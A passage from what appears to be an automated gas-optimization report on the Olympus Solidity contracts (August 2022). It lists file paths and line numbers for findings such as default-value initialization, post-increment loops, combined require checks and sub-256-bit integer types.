guardian_, Authority authority_) Auth(guardian_, authority_) {}  2022-08-olympus/src/test/lib/bonds/BondFixedTermCDA.sol::29 => ) BondBaseCDA(teller_, aggregator_, guardian_, authority_) {}  2022-08-olympus/src/test/lib/bonds/BondFixedTermTeller.sol::50 => ) BondBaseTeller(protocol_, aggregator_, guardian_, authority_) {}  2022-08-olympus/src/test/mocks/Faucet.sol::76 => receive() external payable {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::9 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::33 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::78 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::87 => function INIT() public override onlyKernel {}  2022-08-olympus/src/test/mocks/MockInvalidModule.sol::7 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::22 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/mocks/MockPrice.sol::46 => {}  2022-08-olympus/src/test/mocks/MockPrice.sol::48 => function changeMovingAverageDuration(uint48 movingAverageDuration_) external {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::52 => function latestRound() external view override returns (uint256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::54 => function getAnswer(uint256 roundId) external view override returns (int256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::56 => function getTimestamp(uint256 roundId) external view override returns (uint256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::58 => function description() external view override returns (string memory) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::60 => function version() external view override returns (uint256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::76 => {}  2022-08-olympus/src/test/mocks/MockValidModule.sol::9 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/MockValidUpgradedModule.sol::9 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/policies/BondCallback.t.sol::35 => ) ERC20(_name, _symbol, _decimals) {}  2022-08-olympus/src/test/policies/Heart.t.sol::31 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/policies/Heart.t.sol::33 => function requestPermissions() external view override returns (Permissions[] memory requests) {}  2022-08-olympus/src/test/policies/Operator.t.sol::34 => ) ERC20(_name, _symbol, _decimals) {} ```  ## 8. Don't initialize variables with default value (5 instances)  Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.  ```solidity 2022-08-olympus/src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) {  2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) {  2022-08-olympus/src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ## 9. Use `++i`/`--i` instead of `i++`/`i--` (6 instances)  Using `++i`/`--i` saves 6 gas per loop.  ```solidity 2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::19 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::38 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::16 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::32 => for (uint256 i; i < len; i++) { ```  ## 10. Split `require(xxx && yyy)` to `require(xxx)` and `require(yyy)` (3 instances)  Instead of using operator && on single require check, using double `require()` checks can save more gas.  ```solidity 2022-08-olympus/src/libraries/TransferHelper.sol::20 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::32 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::44 => require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED"); ```  ## 11. Use uint256/int256 instead of other variations (245 instances)  Using smaller data types such as uint8/int8 is more expensive than using uint256/int256. The EVM works with 256bit/32byte words. Every operation is based on these base units. If the data is smaller, further operations are needed to downscale from 256 bits to 8 bits, and this is more expensive than using uint256/int256.  ```solidity 2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}  2022-08-olympus/src/external/OlympusERC20.sol::144 => uint8 v;  2022-08-olympus/src/external/OlympusERC20.sol::201 => uint8 v;  2022-08-olympus/src/external/OlympusERC20.sol::232 => uint8 v,  2022-08-olympus/src/external/OlympusERC20.sol::267 => uint8 v,  2022-08-olympus/src/external/OlympusERC20.sol::458 => uint8 v,  2022-08-olympus/src/external/OlympusERC20.sol::677 => uint8 internal immutable _decimals;  2022-08-olympus/src/external/OlympusERC20.sol::682 => uint8 decimals_  2022-08-olympus/src/external/OlympusERC20.sol::697 => function decimals() public view virtual returns (uint8) {  2022-08-olympus/src/external/OlympusERC20.sol::854 => uint8 v,  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::21 => function decimals() external view returns (uint8);  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::30 => function getRoundData(uint80 _roundId)  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::34 => uint80 roundId,  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::38 => uint80 answeredInRound  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::45 => uint80 roundId,  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::49 => uint80 answeredInRound  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::52 => uint32 debtBuffer;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::55 => uint32 depositInterval;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::56 => int8 scaleAdjustment;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::90 => function setIntervals(uint256 id_, uint32[3] calldata intervals_) external;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/MINTR.sol::25 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/PRICE.sol::44 => uint32 public nextObsIndex;  2022-08-olympus/src/modules/PRICE.sol::47 => uint32 public numObservations;  2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18;  2022-08-olympus/src/modules/PRICE.sol::84 => uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();  2022-08-olympus/src/modules/PRICE.sol::87 => uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();  2022-08-olympus/src/modules/PRICE.sol::97 => numObservations = uint32(movingAverageDuration_ / observationFrequency_);  2022-08-olympus/src/modules/PRICE.sol::113 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/PRICE.sol::127 => uint32 numObs = numObservations;  2022-08-olympus/src/modules/PRICE.sol::185 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  2022-08-olympus/src/modules/PRICE.sol::257 => numObservations = uint32(newObservations);  2022-08-olympus/src/modules/PRICE.sol::289 => numObservations = uint32(newObservations);  2022-08-olympus/src/modules/RANGE.sol::115 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/TRSRY.sol::51 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/VOTES.sol::27 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/policies/Operator.sol::51 => event CushionFactorChanged(uint32 cushionFactor_);  2022-08-olympus/src/policies/Operator.sol::52 => event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);  2022-08-olympus/src/policies/Operator.sol::53 => event ReserveFactorChanged(uint32 reserveFactor_);  2022-08-olympus/src/policies/Operator.sol::54 => event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_);  2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals;  2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals;  2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4;  2022-08-olympus/src/policies/Operator.sol::97 => uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]  2022-08-olympus/src/policies/Operator.sol::106 => if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();  2022-08-olympus/src/policies/Operator.sol::108 => if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])  2022-08-olympus/src/policies/Operator.sol::116 => configParams[7] == uint32(0)  2022-08-olympus/src/policies/Operator.sol::127 => count: uint32(0),  2022-08-olympus/src/policies/Operator.sol::129 => nextObservation: uint32(0),  2022-08-olympus/src/policies/Operator.sol::371 => int8 priceDecimals = _getPriceDecimals(range.cushion.high.price);  2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  2022-08-olympus/src/policies/Operator.sol::375 => uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);  2022-08-olympus/src/policies/Operator.sol::377 => uint8(  2022-08-olympus/src/policies/Operator.sol::378 => 36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals  2022-08-olympus/src/policies/Operator.sol::418 => uint8 oracleDecimals = PRICE.decimals();  2022-08-olympus/src/policies/Operator.sol::426 => int8 priceDecimals = _getPriceDecimals(invCushionPrice);  2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);  2022-08-olympus/src/policies/Operator.sol::430 => uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);  2022-08-olympus/src/policies/Operator.sol::432 => uint8(  2022-08-olympus/src/policies/Operator.sol::433 => 36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals  2022-08-olympus/src/policies/Operator.sol::484 => function _getPriceDecimals(uint256 price_) internal view returns (int8) {  2022-08-olympus/src/policies/Operator.sol::485 => int8 decimals;  2022-08-olympus/src/policies/Operator.sol::493 => return decimals - int8(PRICE.decimals());  2022-08-olympus/src/policies/Operator.sol::516 => function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {  2022-08-olympus/src/policies/Operator.sol::528 => uint32 duration_,  2022-08-olympus/src/policies/Operator.sol::529 => uint32 debtBuffer_,  2022-08-olympus/src/policies/Operator.sol::530 => uint32 depositInterval_  2022-08-olympus/src/policies/Operator.sol::535 => if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();  2022-08-olympus/src/policies/Operator.sol::536 => if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)  2022-08-olympus/src/policies/Operator.sol::548 => function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {  2022-08-olympus/src/policies/Operator.sol::560 => uint32 wait_,  2022-08-olympus/src/policies/Operator.sol::561 => uint32 threshold_,  2022-08-olympus/src/policies/Operator.sol::562 => uint32 observe_  2022-08-olympus/src/policies/Operator.sol::665 => uint32 observe = _config.regenObserve;  2022-08-olympus/src/policies/Operator.sol::705 => _status.high.count = uint32(0);  2022-08-olympus/src/policies/Operator.sol::707 => _status.high.nextObservation = uint32(0);  2022-08-olympus/src/policies/Operator.sol::717 => _status.low.count = uint32(0);  2022-08-olympus/src/policies/Operator.sol::719 => _status.low.nextObservation = uint32(0);  2022-08-olympus/src/policies/interfaces/IOperator.sol::13 => uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%)  2022-08-olympus/src/policies/interfaces/IOperator.sol::14 => uint32 cushionDuration; // duration of a single cushion deployment in seconds  2022-08-olympus/src/policies/interfaces/IOperator.sol::15 => uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info.  2022-08-olympus/src/policies/interfaces/IOperator.sol::16 => uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info.  2022-08-olympus/src/policies/interfaces/IOperator.sol::17 => uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%)  2022-08-olympus/src/policies/interfaces/IOperator.sol::18 => uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds  2022-08-olympus/src/policies/interfaces/IOperator.sol::19 => uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall  2022-08-olympus/src/policies/interfaces/IOperator.sol::20 => uint32 regenObserve; // number of price points to observe to determine regeneration  2022-08-olympus/src/policies/interfaces/IOperator.sol::31 => uint32 count; // current number of price points that count towards regeneration  2022-08-olympus/src/policies/interfaces/IOperator.sol::33 => uint32 nextObservation; // index of the next observation in the observations array  2022-08-olympus/src/policies/interfaces/IOperator.sol::85 => function setCushionFactor(uint32 cushionFactor_) external;  2022-08-olympus/src/policies/interfaces/IOperator.sol::93 => uint32 duration_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::94 => uint32 debtBuffer_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::95 => uint32 depositInterval_  2022-08-olympus/src/policies/interfaces/IOperator.sol::101 => function setReserveFactor(uint32 reserveFactor_) external;  2022-08-olympus/src/policies/interfaces/IOperator.sol::110 => uint32 wait_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::111 => uint32 threshold_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::112 => uint32 observe_  2022-08-olympus/src/scripts/Deploy.sol::137 => uint32(3000), // cushionFactor  2022-08-olympus/src/scripts/Deploy.sol::138 => uint32(3 days), // cushionDuration  2022-08-olympus/src/scripts/Deploy.sol::139 => uint32(100_000), // cushionDebtBuffer  2022-08-olympus/src/scripts/Deploy.sol::140 => uint32(1 hours), // cushionDepositInterval  2022-08-olympus/src/scripts/Deploy.sol::141 => uint32(800), // reserveFactor  2022-08-olympus/src/scripts/Deploy.sol::142 => uint32(1 hours), // regenWait  2022-08-olympus/src/scripts/Deploy.sol::143 => uint32(5), // regenThreshold // 18  2022-08-olympus/src/scripts/Deploy.sol::144 => uint32(7) // regenObserve    // 21  2022-08-olympus/src/test/lib/UserFactory.sol::9 => address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));  2022-08-olympus/src/test/lib/UserFactory.sol::17 => address payable user = payable(address(uint160(uint256(nextUser))));  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::89 => uint32 public defaultTuneInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::90 => uint32 public defaultTuneAdjustment;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::92 => uint32 public minDebtDecayInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::93 => uint32 public minDepositInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::94 => uint32 public minMarketDuration;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::95 => uint32 public minDebtBuffer;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::138 => uint8 payoutTokenDecimals = params_.payoutToken.decimals();  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::139 => uint8 quoteTokenDecimals = params_.quoteToken.decimals();  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::160 => scale = 10**uint8(36 + params_.scaleAdjustment);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::169 => uint32 secondsToConclusion;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::170 => uint32 debtDecayInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::172 => secondsToConclusion = uint32(params_.conclusion - block.timestamp);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::182 => uint32 userDebtDecay = params_.depositInterval * 5;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::296 => function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::338 => function setDefaults(uint32[6] memory defaults_) external override requiresAuth {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::299 => uint8 temp = (48 + uint8(_i - (_i / 10) * 10));  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::52 => uint32 debtBuffer;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::55 => uint32 depositInterval;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::56 => int8 scaleAdjustment;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::90 => function setIntervals(uint256 id_, uint32[3] calldata intervals_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::37 => uint32 length; // time from creation to conclusion.  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::38 => uint32 depositInterval; // target frequency of deposits  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::39 => uint32 tuneInterval; // frequency of tuning  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::40 => uint32 tuneAdjustmentDelay; // time to implement downward tuning adjustments  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::41 => uint32 debtDecayInterval; // interval over which debt should decay completely  2022-08-olympus/src/test/lib/larping.sol::9 => address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));  2022-08-olympus/src/test/lib/larping.sol::139 => function larp(function () external returns(uint8) f, uint8 returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::147 => function larpp(function () external payable returns(uint8) f, uint8 returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::155 => function larpv(function () external view returns(uint8) f, uint8 returned1) internal {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::8 => Vm internal constant vm = Vm(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));  2022-08-olympus/src/test/mocks/MockPrice.sol::14 => uint8 public decimals;  2022-08-olympus/src/test/mocks/MockPrice.sol::30 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/test/mocks/MockPrice.sol::80 => function setDecimals(uint8 decimals_) external {  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::8 => uint8 public s_decimals;  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::19 => function setDecimals(uint8 decimals_) public {  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::23 => function decimals() external view override returns (uint8) {  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::40 => uint80 roundId,  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::44 => uint80 answeredInRound  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::65 => function getRoundData(uint80 _roundId)  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::70 => uint80 roundId,  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::74 => uint80 answeredInRound  2022-08-olympus/src/test/mocks/MockValidModule.sol::15 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/test/mocks/MockValidUpgradedModule.sol::15 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/test/modules/PRICE.t.sol::57 => uint48(8 hours), // uint32 observationFrequency_,  2022-08-olympus/src/test/modules/PRICE.t.sol::58 => uint48(7 days) // uint32 movingAverageDuration_,  2022-08-olympus/src/test/modules/PRICE.t.sol::79 => function initializePrice(uint8 nonce) internal {  2022-08-olympus/src/test/modules/PRICE.t.sol::118 => function makeRandomObservations(uint8 nonce, uint256 observations)  2022-08-olympus/src/test/modules/PRICE.t.sol::163 => function testCorrectness_onlyPermittedPoliciesCanCallUpdateMovingAverage(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::177 => function testCorrectness_updateMovingAverage(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::209 => function testCorrectness_updateMovingAverageMultipleTimes(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::218 => assertEq(price.nextObsIndex(), uint32(15));  2022-08-olympus/src/test/modules/PRICE.t.sol::248 => function testCorrectness_getCurrentPrice(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::290 => function testCorrectness_getLastPrice(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::298 => uint32 numObservations = price.numObservations();  2022-08-olympus/src/test/modules/PRICE.t.sol::299 => uint32 nextObsIndex = price.nextObsIndex();  2022-08-olympus/src/test/modules/PRICE.t.sol::300 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  2022-08-olympus/src/test/modules/PRICE.t.sol::304 => function testCorrectness_getMovingAverage(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::348 => function testCorrectness_initialize(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::369 => function testFail_cannotReinitialize(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::416 => function testCorrectness_changeMovingAverageDuration(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::451 => function testCorrectness_changeObservationFrequency(uint8 nonce) public {  2022-08-olympus/src/test/policies/BondCallback.t.sol::34 => uint8 _decimals  2022-08-olympus/src/test/policies/BondCallback.t.sol::140 => uint32(2000), // cushionFactor  2022-08-olympus/src/test/policies/BondCallback.t.sol::141 => uint32(5 days), // duration  2022-08-olympus/src/test/policies/BondCallback.t.sol::142 => uint32(100_000), // debtBuffer  2022-08-olympus/src/test/policies/BondCallback.t.sol::143 => uint32(1 hours), // depositInterval  2022-08-olympus/src/test/policies/BondCallback.t.sol::144 => uint32(1000), // reserveFactor  2022-08-olympus/src/test/policies/BondCallback.t.sol::145 => uint32(1 hours), // regenWait  2022-08-olympus/src/test/policies/BondCallback.t.sol::146 => uint32(5), // regenThreshold  2022-08-olympus/src/test/policies/BondCallback.t.sol::147 => uint32(7) // regenObserve  2022-08-olympus/src/test/policies/BondCallback.t.sol::246 => int8 _quotePriceDecimals,  2022-08-olympus/src/test/policies/BondCallback.t.sol::247 => int8 _payoutPriceDecimals,  2022-08-olympus/src/test/policies/BondCallback.t.sol::250 => uint8 _payoutDecimals = payoutToken.decimals();  2022-08-olympus/src/test/policies/BondCallback.t.sol::251 => uint8 _quoteDecimals = quoteToken.decimals();  2022-08-olympus/src/test/policies/BondCallback.t.sol::253 => uint256 capacity = 100_000 * 10**uint8(int8(_payoutDecimals) - _payoutPriceDecimals);  2022-08-olympus/src/test/policies/BondCallback.t.sol::255 => int8 scaleAdjustment = int8(_payoutDecimals) -  2022-08-olympus/src/test/policies/BondCallback.t.sol::256 => int8(_quoteDecimals) -  2022-08-olympus/src/test/policies/BondCallback.t.sol::263 => uint8(  2022-08-olympus/src/test/policies/BondCallback.t.sol::264 => int8(36 + _quoteDecimals - _payoutDecimals) +  2022-08-olympus/src/test/policies/BondCallback.t.sol::274 => uint8(  2022-08-olympus/src/test/policies/BondCallback.t.sol::275 => int8(36 + _quoteDecimals - _payoutDecimals) +  2022-08-olympus/src/test/policies/BondCallback.t.sol::290 => uint32(50_000), // uint32 debtBuffer  2022-08-olympus/src/test/policies/BondCallback.t.sol::293 => uint32(24 hours), // uint32 depositInterval (duration)  2022-08-olympus/src/test/policies/BondCallback.t.sol::294 => scaleAdjustment // int8 scaleAdjustment  2022-08-olympus/src/test/policies/Operator.t.sol::33 => uint8 _decimals  2022-08-olympus/src/test/policies/Operator.t.sol::132 => uint32(2000), // cushionFactor  2022-08-olympus/src/test/policies/Operator.t.sol::133 => uint32(5 days), // duration  2022-08-olympus/src/test/policies/Operator.t.sol::134 => uint32(100_000), // debtBuffer  2022-08-olympus/src/test/policies/Operator.t.sol::135 => uint32(1 hours), // depositInterval  2022-08-olympus/src/test/policies/Operator.t.sol::136 => uint32(1000), // reserveFactor  2022-08-olympus/src/test/policies/Operator.t.sol::137 => uint32(1 hours), // regenWait  2022-08-olympus/src/test/policies/Operator.t.sol::138 => uint32(5), // regenThreshold  2022-08-olympus/src/test/policies/Operator.t.sol::139 => uint32(7) // regenObserve  2022-08-olympus/src/test/policies/Operator.t.sol::1519 => operator.setCushionParams(uint32(6 hours), uint32(50_000), uint32(4 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1529 => operator.setRegenParams(uint32(1 days), uint32(8), uint32(11));  2022-08-olympus/src/test/policies/Operator.t.sol::1671 => operator.setCushionFactor(uint32(1000));  2022-08-olympus/src/test/policies/Operator.t.sol::1677 => assertEq(newConfig.cushionFactor, uint32(1000));  2022-08-olympus/src/test/policies/Operator.t.sol::1690 => operator.setCushionFactor(uint32(99));  2022-08-olympus/src/test/policies/Operator.t.sol::1695 => operator.setCushionFactor(uint32(10001));  2022-08-olympus/src/test/policies/Operator.t.sol::1708 => operator.setCushionParams(uint32(24 hours), uint32(50_000), uint32(4 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1714 => assertEq(newConfig.cushionDuration, uint32(24 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1716 => assertEq(newConfig.cushionDebtBuffer, uint32(50_000));  2022-08-olympus/src/test/policies/Operator.t.sol::1718 => assertEq(newConfig.cushionDepositInterval, uint32(4 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1731 => operator.setCushionParams(uint32(1 days) - 1, uint32(100_000), uint32(1 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1736 => operator.setCushionParams(uint32(7 days) + 1, uint32(100_000), uint32(1 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1741 => operator.setCushionParams(uint32(1 days), uint32(100_000), uint32(2 days));  2022-08-olympus/src/test/policies/Operator.t.sol::1746 => operator.setCushionParams(uint32(2 days), uint32(99), uint32(2 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1759 => operator.setReserveFactor(uint32(500));  2022-08-olympus/src/test/policies/Operator.t.sol::1765 => assertEq(newConfig.reserveFactor, uint32(500));  2022-08-olympus/src/test/policies/Operator.t.sol::1778 => operator.setReserveFactor(uint32(99));  2022-08-olympus/src/test/policies/Operator.t.sol::1783 => operator.setReserveFactor(uint32(10001));  2022-08-olympus/src/test/policies/Operator.t.sol::1799 => operator.setRegenParams(uint32(1 hours) - 1, uint32(11), uint32(15));  2022-08-olympus/src/test/policies/Operator.t.sol::1804 => operator.setRegenParams(uint32(1 days), uint32(0), uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1809 => operator.setRegenParams(uint32(1 days), uint32(10), uint32(9));  2022-08-olympus/src/test/policies/Operator.t.sol::1813 => operator.setRegenParams(uint32(1 days), uint32(11), uint32(15));  2022-08-olympus/src/test/policies/Operator.t.sol::1921 => assertEq(status.high.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1922 => assertEq(status.high.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1924 => assertEq(status.low.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1925 => assertEq(status.low.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1939 => assertEq(status.high.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1940 => assertEq(status.high.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1942 => assertEq(status.low.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1943 => assertEq(status.low.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1970 => assertEq(status.high.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1971 => assertEq(status.high.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1972 => assertEq(status.low.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1973 => assertEq(status.low.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1986 => assertEq(status.high.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1987 => assertEq(status.high.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1989 => assertEq(status.low.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1990 => assertEq(status.low.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/PriceConfig.t.sol::69 => uint48(8 hours), // uint32 observationFrequency_,  2022-08-olympus/src/test/policies/PriceConfig.t.sol::70 => uint48(7 days) // uint32 movingAverageDuration_,  2022-08-olympus/src/test/policies/PriceConfig.t.sol::102 => function getObs(uint8 nonce) internal returns (uint256[] memory) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::147 => function testCorrectness_initialize(uint8 nonce) public {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::177 => function testCorrectness_changeMovingAverageDuration(uint8 nonce) public {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::201 => function 